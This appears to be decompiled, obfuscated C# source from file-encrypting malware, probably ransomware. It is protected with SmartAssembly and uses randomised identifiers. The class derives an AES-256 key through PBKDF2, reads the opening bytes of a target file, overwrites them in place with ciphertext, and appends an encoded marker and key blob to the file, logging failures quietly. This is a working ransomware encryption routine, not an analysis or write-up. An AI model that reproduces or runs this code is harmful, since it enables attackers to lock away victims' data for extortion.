using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace MeMbmuKeumkr;

public static class ySuwVrRcfzSLD
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] zidJkcImEttypw(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = sEnpPLdTRIJIoB(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(byte_0, 0, byte_0.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static Rfc2898DeriveBytes sEnpPLdTRIJIoB(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] agfyLqeuBgLy(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (QIACJnVixgJVTY.fMriImqXTatfM == getString_0(107397037))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (QIACJnVixgJVTY.kKDGjFxHZQJlGhg)
			{
				try
				{
					File.AppendAllText(QIACJnVixgJVTY.IiZwcJtLBaX, getString_0(107357383) + string_0 + getString_0(107366619) + ex.Message + getString_0(107361262));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
	}

	public static void KGCCmwJdGyk(string XgVeCBztXofz, byte[] fWRbMxwKJYXUi, byte[] oDzmRvzIUQwwhh = null)
	{
		try
		{
			byte[] array = null;
			if (QIACJnVixgJVTY.fMriImqXTatfM == getString_0(107397037))
			{
				array = (QIACJnVixgJVTY.WrdNZFDyStdHpGA ? Encoding.ASCII.GetBytes(QIACJnVixgJVTY.FcEdCkWglWdhu(QIACJnVixgJVTY.wALhrVwIrRcKfs) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367073)) + Convert.ToString(QIACJnVixgJVTY.wpLcnhrVuuDd) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367073))) : Encoding.ASCII.GetBytes(QIACJnVixgJVTY.FcEdCkWglWdhu(QIACJnVixgJVTY.wALhrVwIrRcKfs) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367114)) + Convert.ToString(QIACJnVixgJVTY.wpLcnhrVuuDd) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367114))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(XgVeCBztXofz, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(fWRbMxwKJYXUi, 0, fWRbMxwKJYXUi.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(XgVeCBztXofz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!QIACJnVixgJVTY.WrdNZFDyStdHpGA)
				{
					fileStream.Write(array, 0, array.Length);
					return;
				}
				fileStream.Write(oDzmRvzIUQwwhh, 0, oDzmRvzIUQwwhh.Length);
				fileStream.Write(array, 0, array.Length);
				return;
			}
			array = (QIACJnVixgJVTY.WrdNZFDyStdHpGA ? Encoding.ASCII.GetBytes(QIACJnVixgJVTY.FcEdCkWglWdhu(QIACJnVixgJVTY.wALhrVwIrRcKfs) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367073)) + Convert.ToString(QIACJnVixgJVTY.wpLcnhrVuuDd) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367073))) : Encoding.ASCII.GetBytes(QIACJnVixgJVTY.FcEdCkWglWdhu(QIACJnVixgJVTY.wALhrVwIrRcKfs) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367114)) + Convert.ToString(QIACJnVixgJVTY.wpLcnhrVuuDd) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367114))));
			FileStream fileStream2 = new FileStream(XgVeCBztXofz, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(fWRbMxwKJYXUi, 0, fWRbMxwKJYXUi.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream = new FileStream(XgVeCBztXofz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!QIACJnVixgJVTY.WrdNZFDyStdHpGA)
			{
				fileStream.Write(array, 0, array.Length);
				return;
			}
			fileStream.Write(oDzmRvzIUQwwhh, 0, oDzmRvzIUQwwhh.Length);
			fileStream.Write(array, 0, array.Length);
		}
		catch (Exception ex)
		{
			if (QIACJnVixgJVTY.kKDGjFxHZQJlGhg)
			{
				try
				{
					File.AppendAllText(QIACJnVixgJVTY.IiZwcJtLBaX, getString_0(107357383) + XgVeCBztXofz + getString_0(107367064) + ex.Message + getString_0(107361262));
				}
				catch (Exception)
				{
				}
			}
			byte[] array = null;
			array = (QIACJnVixgJVTY.WrdNZFDyStdHpGA ? Encoding.ASCII.GetBytes(QIACJnVixgJVTY.FcEdCkWglWdhu(QIACJnVixgJVTY.wALhrVwIrRcKfs) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367073)) + Convert.ToString(QIACJnVixgJVTY.wpLcnhrVuuDd) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367073))) : Encoding.ASCII.GetBytes(QIACJnVixgJVTY.FcEdCkWglWdhu(QIACJnVixgJVTY.wALhrVwIrRcKfs) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367114)) + Convert.ToString(QIACJnVixgJVTY.wpLcnhrVuuDd) + QIACJnVixgJVTY.FcEdCkWglWdhu(getString_0(107367114))));
			FileStream fileStream2 = new FileStream(XgVeCBztXofz, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream2.Write(fWRbMxwKJYXUi, 0, fWRbMxwKJYXUi.Length);
			fileStream2.Close();
			fileStream2.Dispose();
			using FileStream fileStream = new FileStream(XgVeCBztXofz, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!QIACJnVixgJVTY.WrdNZFDyStdHpGA)
			{
				fileStream.Write(array, 0, array.Length);
				return;
			}
			fileStream.Write(oDzmRvzIUQwwhh, 0, oDzmRvzIUQwwhh.Length);
			fileStream.Write(array, 0, array.Length);
		}
	}

	static ySuwVrRcfzSLD()
	{
		Strings.CreateGetStringDelegate(typeof(ySuwVrRcfzSLD));
	}
}
